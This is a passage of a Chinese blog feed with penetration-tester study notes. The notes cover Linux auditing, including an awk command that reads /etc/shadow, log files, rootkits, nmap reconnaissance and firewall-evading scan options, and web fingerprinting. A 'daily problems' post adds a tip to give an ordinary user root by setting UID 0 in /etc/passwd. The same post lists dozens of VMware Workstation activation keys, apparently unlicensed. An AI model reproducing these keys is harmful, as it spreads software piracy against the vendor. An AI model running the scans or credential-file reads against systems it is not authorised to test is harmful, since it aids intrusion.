class="line">-y至少一个特殊字符</span><br></pre></td></tr></table></figure><h5 id="账户安全"><a href="#账户安全" class="headerlink" title="账户安全"></a>账户安全</h5><p>使用下面的命令检查空口令账户是否存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F：&#39;($2&#x3D;&#x3D;&quot;!!&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p>检测UID为0的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F:&#39;($3&#x3D;&#x3D;&quot;0&quot;)&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h4 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h4><p>在Linux系统中，文件系统采用树状层次的目录结构，最顶层是根目录，用”/“表示，往下延申其各级子目录。</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802160959356.png" alt="image-20200802160959356"></p><p>文件系统安全</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802161106546.png" alt="image-20200802161106546"></p><p>Linux主要文件系统类型</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802161203483.png" alt="image-20200802161203483"></p><h5 id="系统文件属性"><a href="#系统文件属性" class="headerlink" title="系统文件属性"></a>系统文件属性</h5><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802162054144.png" alt="image-20200802162054144"></p><p>第一部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">由10个字符组成，第一个字符表示文件类型</span><br><span class="line">&quot;-&quot;表示普通文件</span><br><span class="line">d表示目录</span><br><span class="line">l表示链接文件</span><br><span class="line">s表示套接字文件</span><br><span class="line">p表示命名管道文件</span><br><span class="line">c表示字符设备文件</span><br><span class="line">b表示块设备文件</span><br></pre></td></tr></table></figure><p>第二部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以冒号分隔，冒号前是文件的所有者，冒号后是文件所有者的用户组</span><br></pre></td></tr></table></figure><p>第三部分：表示文件的硬链接数</p><p>第四部分：以字节为单位的文件大小</p><p>第5，6，7部分表示文件最后的更新时间</p><p>第8部分：文件名</p><h5 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h5><p>Linux有4种基本系统文件类型：目录文件、普通文件、链接文件、特殊文件</p><p>通过ls -l命令可以返回文件的相关属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">普通文件：</span><br><span class="line">普通文件包括文本文件、程序代码文件、shell脚本、二进制可执行文件等</span><br><span class="line"></span><br><span class="line">目录文件：</span><br><span class="line">目录作为一个文件来对待，用d来表示，目录下可以包括文件和子目录</span><br><span class="line"></span><br><span class="line">链接文件：</span><br><span class="line">链接文件为一个指向文件的指针，通过链接文件，用户访问的将是指针指向的文件</span><br><span class="line"></span><br><span class="line">特殊文件：</span><br><span class="line">Linux中的特殊文件有三种。</span><br><span class="line">套接字文件socket：可以实现网络通信，标识值为s</span><br><span class="line">命名管道文件：可以实现进程间的通信，标识值为p</span><br><span class="line">设备文件：Linux为每个设备分配一个设备文件，存放在&#x2F;dev目录下，其中键盘属于字符设备，标识值为c</span><br><span class="line">内存、磁盘属于块设备文件，标识值为b</span><br></pre></td></tr></table></figure><p>文件和目录权限</p><p><img src="/2020/07/27/PTE%E7%90%86%E8%AE%BA2/image-20200802165836638.png" alt="image-20200802165836638"></p><h5 id="文件系统权限管理"><a href="#文件系统权限管理" class="headerlink" title="文件系统权限管理"></a>文件系统权限管理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">更改文件和目录所有者：chown命令</span><br><span class="line">修改权限：chmod</span><br><span class="line">设置ACL：setfacl</span><br><span class="line">锁定文件：chattr</span><br><span class="line">设置默认权限：umask</span><br></pre></td></tr></table></figure><h4 id="Linux日志与审计"><a href="#Linux日志与审计" class="headerlink" title="Linux日志与审计"></a>Linux日志与审计</h4><h5 id="日志用途"><a href="#日志用途" class="headerlink" title="日志用途"></a>日志用途</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统审计：记录登录系统的用户和日常行为</span><br><span class="line">监测追踪：追踪溯源攻击者</span><br><span class="line">分析统计：系统性能、错误等统计</span><br></pre></td></tr></table></figure><p>Linux日志可以保存几乎所有的操作记录，Linux发行版默认的日志守护进程为rsyslog，位于/etc/rsyslog或/etc/rsyslogd，默认配置文件为/etc/rsyslog.conf。默认配置 下，日志文件都存放在”/var/log”目录下。</p><h5 id="Linux日志等级"><a href="#Linux日志等级" class="headerlink" title="Linux日志等级"></a>Linux日志等级</h5><p>Linux日志等级，priority表示产生日志的等级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">debug:有调试信息，日志信息最多</span><br><span class="line">info：一般信息日志，最常用</span><br><span class="line">notice：最具重要性的普通条件的信息</span><br><span class="line">warning：警告级别</span><br><span class="line">err：错误级别，阻止某个功能或模块不能正常工作的信息</span><br><span class="line">crit：严重级别，阻止整个系统或软件不能正常工作的信息</span><br><span class="line">alert：需要理解修改的信息</span><br><span class="line">emerg：内核崩溃等严重信息</span><br><span class="line">none：什么都不记录</span><br><span class="line">从上到下，级别从低到高，记录的信息越来越少</span><br></pre></td></tr></table></figure><p>var/log下日志文件解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">系统引导日志：&#x2F;var&#x2F;log&#x2F;boot.log</span><br><span class="line"></span><br><span class="line">内核启动日志：&#x2F;var&#x2F;log&#x2F;dmesg</span><br><span class="line"></span><br><span class="line">系统日志：&#x2F;var&#x2F;log&#x2F;messages</span><br><span class="line"></span><br><span class="line">邮件系统日志：&#x2F;var&#x2F;log&#x2F;maillog</span><br><span class="line"></span><br><span class="line">FTP系统日志：&#x2F;var&#x2F;log&#x2F;xferlog</span><br><span class="line"></span><br><span class="line">安全信息：&#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">登录记录：&#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"></span><br><span class="line">RPM软件包：&#x2F;var&#x2F;log&#x2F;rpmpkgs</span><br><span class="line"></span><br><span class="line">cron计划任务日志：&#x2F;var&#x2F;log&#x2F;cron</span><br><span class="line"></span><br><span class="line">记录现在登录的用户：&#x2F;var&#x2F;run&#x2F;utmp</span><br><span class="line"></span><br><span class="line">记录所有用户登录和注销信息：&#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"></span><br><span class="line">记录最后登录信息：&#x2F;var&#x2F;log&#x2F;lastlog</span><br><span class="line"></span><br><span class="line">记录用户错误登录尝试：&#x2F;var&#x2F;log&#x2F;btmp</span><br></pre></td></tr></table></figure><h4 id="Rootkit与病毒木马检查"><a href="#Rootkit与病毒木马检查" class="headerlink" title="Rootkit与病毒木马检查"></a>Rootkit与病毒木马检查</h4><p>Rootkit是一种特殊的恶意软件。Rootkit主要功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">隐藏进程</span><br><span class="line">隐藏网络端口</span><br><span class="line">隐藏文件</span><br><span class="line">后门功能</span><br><span class="line">键盘记录器</span><br></pre></td></tr></table></figure><p>可以使用chkrootkit检查rootkit，官网为http:[]www.[]chkrootkit.org</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="PTE" scheme="http://yoursite.com/categories/PTE/"/>
    
    
      <category term="PTE" scheme="http://yoursite.com/tags/PTE/"/>
    
  </entry>
  
  <entry>
    <title>日常问题解决</title>
    <link href="http://yoursite.com/2020/07/16/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    <id>http://yoursite.com/2020/07/16/日常问题解决/</id>
    <published>2020-07-16T08:12:25.000Z</published>
    <updated>2020-08-01T14:48:44.142Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="日常小知识"><a href="#日常小知识" class="headerlink" title="日常小知识"></a>日常小知识</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h4 id="校验MD5"><a href="#校验MD5" class="headerlink" title="校验MD5"></a>校验MD5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertUtil -hashfile D:\XXX\XX\XXXXXXX.iso MD5</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="kali设置中文"><a href="#kali设置中文" class="headerlink" title="kali设置中文"></a>kali设置中文</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install locales</span><br><span class="line">apt install ttf-wqy-zenhei</span><br><span class="line">apt install xfonts-intl-chinese</span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>选中下面三个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">en_US.UTF-8</span><br><span class="line">zh_CN.UTF-8</span><br><span class="line">zh_CN.GBK</span><br></pre></td></tr></table></figure><p>接着选择字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zh_CN.UTF-8</span><br></pre></td></tr></table></figure><p>然后reboot</p><h4 id="kali使用全局代理"><a href="#kali使用全局代理" class="headerlink" title="kali使用全局代理"></a>kali使用全局代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/%E6%97%A5%E5%B8%B8%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/image-20200727104600146.png" alt="image-20200727104600146"></p><p>在需要代理的命令前加上 proxychains</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl https:&#x2F;&#x2F;www.xx.xxx.xx</span><br></pre></td></tr></table></figure><h4 id="Ubuntu普通用户改root用户"><a href="#Ubuntu普通用户改root用户" class="headerlink" title="Ubuntu普通用户改root用户"></a>Ubuntu普通用户改root用户</h4><p>首先安装编辑器gedit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gedit</span><br></pre></td></tr></table></figure><p>然后编辑/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>将想要修改的用户的ID，一般为<code>1000:1000</code>,改为root用户ID<code>0:0</code></p><p>保存退出，重启即可。</p><h4 id="Ubuntu安装vmware-tool"><a href="#Ubuntu安装vmware-tool" class="headerlink" title="Ubuntu安装vmware tool"></a>Ubuntu安装vmware tool</h4><p>虚拟机点击安装vmware tool，在桌面上会自动出现CD标志，进入进入其中，会发现无法对VM***.tar.gz进行操作，显示只读。</p><p>解决方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.拖动VM***.tar.gz至桌面，tar zxvf VM***.tar.gz即可</span><br><span class="line">2.进入解压后的文件夹，执行</span><br><span class="line">chmod +x vmware-install.pl</span><br><span class="line">sudo .&#x2F;vmware-install.pl</span><br><span class="line">3.选择yes，一路回车，提示yes输入yes即可，最后reboot</span><br></pre></td></tr></table></figure><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><h4 id="VMware激活"><a href="#VMware激活" class="headerlink" title="VMware激活"></a>VMware激活</h4><p>VMware Workstation Pro 15 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">UY758-0RXEQ-M81WP-8ZM7Z-Y3HDA</span><br><span class="line">VF750-4MX5Q-488DQ-9WZE9-ZY2D6</span><br><span class="line">UU54R-FVD91-488PP-7NNGC-ZFAX6</span><br><span class="line">YC74H-FGF92-081VZ-R5QNG-P6RY4</span><br><span class="line">YC34H-6WWDK-085MQ-JYPNX-NZRA2</span><br><span class="line">ZC10K-8EF57-084QZ-VXYXE-ZF2XF</span><br><span class="line">UF71K-2TW5J-M88QZ-8WMNT-WKUY4</span><br><span class="line">AZ7MK-44Y1J-H819Z-WMYNC-N7ATF</span><br><span class="line">CU702-DRD1M-H89GP-JFW5E-YL8X6</span><br><span class="line">YY5EA-00XDJ-480RP-35QQV-XY8F6</span><br><span class="line">VA510-23F57-M85PY-7FN7C-MCRG0</span><br><span class="line">VC1J8-0TX11-M84WP-2WNGX-PQKD8</span><br><span class="line">AA7EU-FUE97-4896Q-3WYZC-WYKY0</span><br><span class="line">ZY7EU-2JG01-H8EDZ-9NYNX-ZVHW0</span><br><span class="line">AZ312-2FE41-M81LP-R6WEZ-NA2Z4</span><br><span class="line">AU71H-0VE44-M81DZ-77Y5C-QG0G4</span><br><span class="line">ZA7HK-AWFE2-M80AY-KDNZG-XQ2X8</span><br><span class="line">CA58K-DDF13-H88PY-VWN7V-XKHW2</span><br><span class="line">GV10H-A4E02-H84VY-JXYEV-NAATD</span><br><span class="line">VA71K-83Y55-H88NP-JWZEG-YYK92</span><br><span class="line">FY3JH-6XGEN-088HZ-95WET-QCKVD</span><br><span class="line">VG5HH-D6E04-0889Y-QXZET-QGUC8</span><br><span class="line">CY55A-F6G80-H85HQ-WNN5X-W38W4</span><br><span class="line">AC11H-4HZ05-08EDQ-APQGX-YCUC8</span><br><span class="line">ZG780-8EZ9M-M89LY-M5PEG-W2AZ8</span><br><span class="line">ZF3NU-D6XEJ-48E7Q-27YNC-PC8ED</span><br><span class="line">AV5M0-F4W8M-088PZ-36ZNV-NFHE2</span><br><span class="line">AU15R-A0Z4N-M88HY-HQYNX-QYKD6</span><br><span class="line">VY110-4RD50-H886P-5FMN9-WPUUD</span><br><span class="line">GF302-4HW44-H88DQ-WZXNV-Q3R94</span><br><span class="line">UA752-0KF9J-0811Y-MQNEX-ZUAGF</span><br></pre></td></tr></table></figure><p>VMware Workstation Pro 14 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AC5XK-0ZD4H-088HP-9NQZV-ZG2R4</span><br><span class="line">FF590-2DX83-M81LZ-XDM7E-MKUT4</span><br><span class="line">CG54H-D8D0H-H8DHY-C6X7X-N2KG6</span><br><span class="line">ZC3WK-AFXEK-488JP-A7MQX-XL8YF</span><br><span class="line">AA702-81D8N-0817Y-75PQT-Q70A4</span><br><span class="line">YC592-8VF55-M81AZ-FWW5T-WVRV0</span><br><span class="line">FC78K-FKED6-H88LZ-0QPEE-QP8X6</span><br><span class="line">UV1H2-AKWD2-H8EJZ-GGMEE-PCATD</span><br><span class="line">AC310-0VG0P-M88CQ-YWY5Z-QPRG0</span><br><span class="line">FF31K-AHZD1-H8ETZ-8WWEZ-WUUVA</span><br><span class="line">CV7T2-6WY5Q-48EWP-ZXY7X-QGUWD</span><br></pre></td></tr></table></figure><p>VMware Workstation Pro 12 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">5A02H-AU243-TZJ49-GTC7K-3C61N</span><br><span class="line">VF5XA-FNDDJ-085GZ-4NXZ9-N20E6</span><br><span class="line">UC5MR-8NE16-H81WY-R7QGV-QG2D8</span><br><span class="line">ZG1WH-ATY96-H80QP-X7PEX-Y30V4</span><br><span class="line">AA3E0-0VDE1-0893Z-KGZ59-QGAVF</span><br><span class="line">VU1XA-DGE5L-080NZ-LQNNG-MY2R8</span><br><span class="line">YZ5N2-F4E96-485HY-4WPXV-XQ2Z8</span><br><span class="line">YZ54H-A3G5N-4815Y-J6P79-QG0G8</span><br><span class="line">YZ3R0-6EDE0-M89HZ-4YZEC-NUAU8</span><br></pre></td></tr></table></figure><p>VMware Workstation Pro 11 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1F04Z-6D111-7Z029-AV0Q4-3AEH8</span><br></pre></td></tr></table></figure><p>VMware Workstation Pro 10 激活密钥许可证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1Z0G9-67285-FZG78-ZL3Q2-234JG</span><br><span class="line">4C4EK-89KDL-5ZFP9-1LA5P-2A0J0</span><br><span class="line">HY086-4T01N-CZ3U0-CV0QM-13DNU</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://yoursite.com/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="日常踩坑" scheme="http://yoursite.com/tags/%E6%97%A5%E5%B8%B8%E8%B8%A9%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>PTE理论1</title>
    <link href="http://yoursite.com/2020/07/16/PTE%E7%90%86%E8%AE%BA1/"/>
    <id>http://yoursite.com/2020/07/16/PTE理论1/</id>
    <published>2020-07-16T00:55:34.000Z</published>
    <updated>2020-07-27T03:12:42.220Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="PTE理论1"><a href="#PTE理论1" class="headerlink" title="PTE理论1"></a>PTE理论1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h4 id="信息收集概述"><a href="#信息收集概述" class="headerlink" title="信息收集概述"></a>信息收集概述</h4><p>黑客在攻击前、过程中对目标所进行的探测活动。</p><p>信息收集的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缩小攻击范围</span><br><span class="line">了解架构安全</span><br><span class="line">建立信息数据库</span><br><span class="line">描绘网络拓扑</span><br></pre></td></tr></table></figure><p>信息收集分类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主动信息收集</span><br><span class="line">被动信息收集</span><br></pre></td></tr></table></figure><p>信息收集内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络信息：域名、控制策略、开放端口、协议、防火墙、认证机制、VPN接入点、IP地址、网段</span><br><span class="line">系统信息：系统banner、目录、临时文件、路由表、系统架构</span><br><span class="line">组织信息：组织背景、员工信息、邮箱&#x2F;电话、地址、官网</span><br></pre></td></tr></table></figure><p>主动信息收集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">netbios枚举</span><br><span class="line">SNMP枚举</span><br><span class="line">Linux枚举</span><br><span class="line">LDAP枚举</span><br><span class="line">ntp枚举</span><br><span class="line">smtp枚举</span><br><span class="line">DNS枚举</span><br></pre></td></tr></table></figure><h4 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域名信息</span><br><span class="line">所有者联系方式</span><br><span class="line">域名服务器</span><br><span class="line">网站IP范围</span><br><span class="line">域名创建时间</span><br><span class="line">过期记录</span><br><span class="line">最近更新记录</span><br></pre></td></tr></table></figure><p>DNS资源记录类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A记录</span><br><span class="line">CNAME</span><br><span class="line">NS</span><br><span class="line">PTR</span><br><span class="line">MX</span><br></pre></td></tr></table></figure><p>DNS查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali自带nslookup</span><br><span class="line">dig</span><br></pre></td></tr></table></figure><p>确定地址范围作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">协助绘制目标网络拓扑图</span><br><span class="line">使用ARIN whois database search 工具找到IP地址范围</span><br><span class="line">通过区域因特网注册机构找到IP地址范围和目标子网掩码</span><br></pre></td></tr></table></figure><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><p>用途</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">端口探测</span><br><span class="line">主机探测</span><br><span class="line">系统探测</span><br><span class="line">版本探测</span><br></pre></td></tr></table></figure><p>常用参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-v 详细</span><br><span class="line">-p 指定端口范围</span><br><span class="line">-O 操作系统识别</span><br><span class="line">-A 全面检测</span><br><span class="line">-sV 探测端口-服务器版本</span><br><span class="line">-sA ACK扫描-探测防火墙</span><br><span class="line">-sP ping扫描-快速扫描</span><br><span class="line">-sS TCP SYN半开放扫描-隐蔽扫描</span><br><span class="line">-sT 全连接扫描-防火墙会留日志</span><br><span class="line">-sU UDP扫描-确定端口开放</span><br></pre></td></tr></table></figure><p>常用扫描参数示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">半开放扫描全端口：nmap -sS -p 1-65535 -v ip&#x2F;url</span><br><span class="line"></span><br><span class="line">扫描C段存活主机：nmap -sP ip&#x2F;url</span><br><span class="line"></span><br><span class="line">指定端口扫描：nmap -p 80 ip&#x2F;url</span><br><span class="line"></span><br><span class="line">扫描主机操作系统：nmap -O ip&#x2F;url</span><br><span class="line"></span><br><span class="line">主机详细扫描：nmap -A -v IP&#x2F;url</span><br><span class="line"></span><br><span class="line">穿透防火墙扫描：</span><br><span class="line">nmap -Pn -A ip&#x2F;url</span><br><span class="line">nmap -sS -T4 ip&#x2F;url</span><br><span class="line">nmap -sF -T4 ip&#x2F;url</span><br><span class="line">nmap -sA -T4 ip&#x2F;url</span><br></pre></td></tr></table></figure><h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>大部分应用组件存在说明当前服务名称和版本的特征，识别这些特征即可获取当前服务信息。</p><p>web架构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">大多数web组件可以粗略的分为三个组件：</span><br><span class="line">客户端</span><br><span class="line">服务端</span><br><span class="line">后端存储，一般是DBMS，用于查询和存储数据</span><br></pre></td></tr></table></figure><p>客户端技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端技术包括html、falsh、javascript。。。</span><br></pre></td></tr></table></figure><p>服务端技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web服务器：Apache、Nginx、IIS、linghttpd。。。</span><br><span class="line">应用服务器：tomcat、jboss、Oracle。。。。</span><br><span class="line">编程语言：PHP、java、ruby、Python、C#</span><br></pre></td></tr></table></figure><p>后端存储技术</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">中小型网站，一般数据库和web服务器在同一台服务器上。</span><br><span class="line">关系型数据库：Mysql、Oracle、DB2、SQL Server、Postgresql、Sqlite。。。</span><br><span class="line">NOSQL：MongoDB、CouchDB、Redis。。。</span><br><span class="line"></span><br><span class="line">目录访问：openLDAP、Active Directory</span><br></pre></td></tr></table></figure><p>常见的web应用指纹识别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">特殊文件的MD5值匹配</span><br><span class="line">请求响应主体内容或头信息的关键字匹配</span><br><span class="line">请求响应主体内容或头信息的正则匹配</span><br><span class="line">基于url关键字识别</span><br><span class="line">基于TCP&#x2F;IP请求协议识别服务指纹</span><br></pre></td></tr></table></figure><p>手工检测恶意指纹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP分析：</span><br><span class="line">1.观察响应头的server、X-forward-by、cookie字段</span><br><span class="line">2.使用畸形的host字段的HTTP请求试探，观察响应头</span><br><span class="line"></span><br><span class="line">网站的HTML源码</span><br></pre></td></tr></table></figure><p>根据网站页面后缀判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存在.php结尾的文件说明该web应用是用PHP写的；</span><br><span class="line">存在.jsp或.do的文件，说明该web应用是用java写的；</span><br><span class="line">存在.asp或.aspx结尾的文件，说明该web应用可能是由vb或C#写的</span><br></pre></td></tr></table></figure><p>浏览网站favicon.ico</p><figure 